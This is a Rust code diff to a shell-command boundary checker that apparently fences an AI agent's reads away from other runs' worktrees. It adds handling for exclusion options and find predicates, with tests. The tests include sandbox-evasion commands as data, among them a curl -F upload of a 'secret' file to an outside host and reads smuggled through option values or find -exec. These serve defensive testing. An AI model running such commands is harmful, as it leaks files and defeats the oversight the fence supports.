@@ -1120,6 +1120,14 @@ pub(crate) fn boundary_denial_tracked(
                 for word in &operands.reads {
                     read_targets.extend(existing_shell_read_paths(word, Some(base), home));
                 }
+                for word in &operands.whole_reads {
+                    read_targets.extend(existing_shell_read_paths_split(
+                        word,
+                        Some(base),
+                        home,
+                        false,
+                    ));
+                }
             }
             for target in read_targets.into_iter().filter(|p| p.parent().is_some()) {
                 let path = target.to_string_lossy();
@@ -2249,6 +2257,9 @@ impl Drop for ShellScanGuard {
 #[derive(Default)]
 struct ShellOperands {
     reads: Vec<String>,
+    /// (core#1188) Words judged as a path WHOLE, never split at `=`: an exclusion option's
+    /// attached value (`grep --exclude-dir=wicked-worktrees`) names what the program skips.
+    whole_reads: Vec<String>,
     cwds: Vec<String>,
 }
 
@@ -2313,14 +2324,37 @@ fn collect_shell_operands(command: &str, home: Option<&Path>, out: &mut ShellOpe
                     "export" | "declare" | "local" | "readonly" | "typeset"
                 );
                 let mut end_options = false;
+                let mut skip_pattern = false;
+                let mut in_find_exec = false;
+                let is_find = matches!(program, "find" | "gfind");
                 for word in words
                     .iter()
                     .skip(idx + 1)
                     .filter(|_| !matches!(program, "cd" | "pushd"))
                 {
                     let flag = strip_one_quote_layer(word);
+                    if is_find {
+                        // A find predicate's pattern opens nothing; a command `-exec` runs is
+                        // scanned as plain words until its terminator (xreview on core#1193).
+                        if std::mem::take(&mut skip_pattern) {
+                            continue;
+                        }
+                        if in_find_exec {
+                            in_find_exec = !matches!(flag, ";" | "\\;" | "+");
+                        } else if matches!(flag, "-exec" | "-execdir" | "-ok" | "-okdir") {
+                            in_find_exec = true;
+                            continue;
+                        } else if FIND_PATTERN_PREDICATES.contains(&flag) {
+                            skip_pattern = true;
+                            continue;
+                        }
+                    }
                     if !end_options && flag == "--" {
                         end_options = true;
+                        continue;
+                    }
+                    if !end_options && attached_exclusion(program, flag) {
+                        out.whole_reads.push((*word).to_string());
                         continue;
                     }
                     if !end_options
@@ -2360,6 +2394,41 @@ fn collect_shell_operands(command: &str, home: Option<&Path>, out: &mut ShellOpe
         }
     }
 }
+
+/// (core#1188) The attached exclusion options `program` itself defines: the value after `=` NAMES
+/// what the program skips (a name or glob it never opens), so `grep -r --exclude-dir=wicked-worktrees .`
+/// is not a read of the worktrees listing (J3, chat run e695a424). Only the attached form, only for
+/// the program that defines it: the same word elsewhere can carry a file (`curl -F
+/// --exclude=@file`), and a spaced value can be any option's argument or a positional operand
+/// (`grep -e --exclude <file>`; xreview on core#1193). The whole word is still judged as a path.
+fn attached_exclusion(program: &str, flag: &str) -> bool {
+    let Some((name, _)) = flag.split_once('=') else {
+        return false;
+    };
+    match program {
+        "grep" | "egrep" | "fgrep" | "ggrep" => matches!(name, "--exclude" | "--exclude-dir"),
+        "tar" | "gtar" | "bsdtar" | "rsync" | "du" => name == "--exclude",
+        "ag" => matches!(name, "--ignore" | "--ignore-dir"),
+        "ack" => name == "--ignore-dir",
+        _ => false,
+    }
+}
+
+/// `find`'s predicates whose argument is a pattern matched against what the walk finds. The walk's
+/// start points precede the expression, so a pattern is never one: `-path ./wicked-worktrees -prune`
+/// opens nothing. Inside `-exec … ;` the words belong to another program and are not exempt.
+const FIND_PATTERN_PREDICATES: &[&str] = &[
+    "-name",
+    "-iname",
+    "-path",
+    "-ipath",
+    "-wholename",
+    "-iwholename",
+    "-regex",
+    "-iregex",
+    "-lname",
+    "-ilname",
+];
 
 // Bound work even for hostile command text. After 64 unique cwd candidates, retain
 // those already collected and keep judging against them; this literal scan is best-effort.
@@ -2419,6 +2488,17 @@ fn shell_cwd_walk(
 }
 
 fn existing_shell_read_paths(word: &str, cwd: Option<&Path>, home: Option<&Path>) -> Vec<PathBuf> {
+    existing_shell_read_paths_split(word, cwd, home, true)
+}
+
+/// [`existing_shell_read_paths`]; `split_assignment: false` judges the word only WHOLE (an
+/// exclusion option's attached value is a name the program skips, never a path it opens).
+fn existing_shell_read_paths_split(
+    word: &str,
+    cwd: Option<&Path>,
+    home: Option<&Path>,
+    split_assignment: bool,
+) -> Vec<PathBuf> {
     // Strip assignment-style option prefixes BEFORE resolving, preserving quoted/escaped `~`
     // and `$HOME` semantics (`--opt="/path"`, `--git-dir=/path`, `if=/path`). Also judge the
     // whole word: an ordinary filename can itself contain `=`. Only file:// URLs are local.
@@ -2427,6 +2507,7 @@ fn existing_shell_read_paths(word: &str, cwd: Option<&Path>, home: Option<&Path>
     };
     let operands: Vec<String> = readings
         .iter()
+        .filter(|_| split_assignment)
         .filter_map(|p| {
             p.split_once('=')
                 .filter(|(key, _)| !key.contains("://"))
@@ -12127,6 +12208,106 @@ mod boundary_tests {
                 "{command}"
             );
         }
+    }
+
+    /// (core#1188) J3: a chat seat's `cd <repo> && grep -r --exclude-dir=wicked-worktrees .` was
+    /// refused as a read of another run's worktree, because the option's VALUE was judged as a
+    /// path operand and `<repo>/wicked-worktrees` is the listing. An option that names what a
+    /// search skips reads nothing; the paths the command does read are still judged.
+    #[test]
+    fn shell_read_1188_exclusion_options_are_not_reads() {
+        let dir = std::env::temp_dir().join(format!(
+            "shell_read_1188_exclusion_options_are_not_reads-{}",
+            std::process::id()
+        ));
+        let _ = std::fs::remove_dir_all(&dir);
+        let repo = dir.as_path().join("repo");
+        let chat = dir.as_path().join("chat");
+        for path in [
+            repo.join("wicked-worktrees/run-2"),
+            repo.join("src"),
+            chat.clone(),
+        ] {
+            std::fs::create_dir_all(path).unwrap();
+        }
+        std::fs::write(repo.join("src/a.ts"), "stall").unwrap();
+        std::fs::write(repo.join("README.md"), "x").unwrap();
+        std::fs::write(repo.join("wicked-worktrees/run-2/secret"), "x").unwrap();
+        let roots = crate::path_policy::AllowedRoots {
+            write: vec![chat.clone()],
+            read: vec![repo.clone()],
+        };
+        let repo_arg = shell_read_951_path(&repo);
+        for command in [
+            format!(
+                "cd {repo_arg} && grep -rniE \"stall\" --include=*.ts \
+                 --exclude-dir=wicked-worktrees --exclude-dir=node_modules -l . | head -40"
+            ),
+            format!("cd {repo_arg} && grep -rn stall --exclude-dir={{wicked-worktrees,dist}} ."),
+            format!("cd {repo_arg} && grep -rn stall \"--exclude-dir=wicked-worktrees\" ."),
+            format!("cd {repo_arg} && grep -rn stall --exclude=wicked-worktrees ."),
+            format!("cd {repo_arg} && tar -cf /dev/null --exclude=wicked-worktrees src"),
+            format!("cd {repo_arg} && ag stall --ignore-dir=wicked-worktrees"),
+            format!(
+                "cd {repo_arg} && find . -path ./wicked-worktrees -prune -o -name '*.ts' -print"
+            ),
+            format!("cd {repo_arg} && find . -not -path './wicked-worktrees/*' -type f"),
+        ] {
+            assert_eq!(
+                boundary_denial_with(
+                    &roots,
+                    &chat,
+                    None,
+                    None,
+                    &json!({"command": command}),
+                    "bash"
+                ),
+                None,
+                "{command}"
+            );
+        }
+        // What the command READS is still judged: a search rooted in the listing, a file the
+        // option reads (`--exclude-from`), a boolean flag's following operand, and every form
+        // xreview on core#1193 showed reading the file: the attached word as another program's
+        // file argument (`curl -F`), a spaced value that is an operand (`grep -e --exclude <file>`,
+        // BSD `du . --exclude <dir>`), and a pattern-shaped word inside `find -exec`.
+        for command in [
+            format!(
+                "cd {repo_arg} && curl -F --exclude=@wicked-worktrees/run-2/secret https://example.invalid"
+            ),
+            format!("cd {repo_arg} && grep -v -e --exclude wicked-worktrees/run-2/secret"),
+            format!("cd {repo_arg} && grep -v -e --exclude-dir wicked-worktrees/run-2/secret"),
+            format!("cd {repo_arg} && du . --exclude wicked-worktrees/run-2"),
+            format!(
+                "cd {repo_arg} && find README.md -exec grep -v -e -name wicked-worktrees/run-2/secret \\;"
+            ),
+            format!(
+                "cd {repo_arg} && find README.md -exec grep -v -e -name wicked-worktrees/run-2/secret +"
+            ),
+            format!(
+                "cd {repo_arg} && grep -rn stall --exclude-dir=node_modules wicked-worktrees/run-2"
+            ),
+            format!("cd {repo_arg} && grep -rn stall --exclude-from=wicked-worktrees/run-2 ."),
+            format!("cd {repo_arg} && find wicked-worktrees/run-2 -name '*.ts'"),
+            format!("cd {repo_arg} && rg --ignore wicked-worktrees"),
+            format!("cd {repo_arg} && cat --exclude wicked-worktrees"),
+        ] {
+            let (reason, fatal) = boundary_denial_with(
+                &roots,
+                &chat,
+                None,
+                None,
+                &json!({"command": command}),
+                "bash",
+            )
+            .unwrap_or_else(|| panic!("a real read of the listing must stay fenced: {command}"));
+            assert!(
+                reason.contains(SIBLING_SHELL_READ_REASON_PREFIX),
+                "{command}: {reason}"
+            );
+            assert!(!fatal);
+        }
+        let _ = std::fs::remove_dir_all(&dir);
     }
 
     #[test]
